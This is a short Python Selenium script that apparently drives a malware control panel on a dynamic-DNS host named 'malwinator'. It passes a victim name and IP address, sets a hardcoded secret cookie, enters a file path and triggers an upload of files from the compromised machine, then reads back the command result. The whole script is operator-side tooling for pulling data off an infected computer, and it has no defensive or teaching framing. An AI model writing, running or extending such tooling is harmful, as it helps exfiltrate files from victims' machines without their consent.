from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
import time
import os


def check_file(path, file):
    arr = [ x for x in os.listdir(path) if '.' in x]
    return file in arr

def check_upload(path, file):
    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()))
    try:
        driver.get(
            "http://malwinator.chickenkiller.com/upload?name=VLAD&ip=86.120.162.222"
        )
        driver.add_cookie({"name": "superSecretKey", "value": "c457r4v371"})
        driver.refresh()
        upload_path_input = driver.find_element(By.ID, "path")
        upload_path_input.send_keys(path)
        radio_button = driver.find_element(By.ID,file)
        radio_button.click()
        upload_button = driver.find_element(By.CLASS_NAME, "btn-upload")
        upload_button.click()
        time.sleep(2)  
        upload_result = driver.find_element(By.ID, "command-result").text
        return upload_result[:27]

    finally:
        driver.quit()
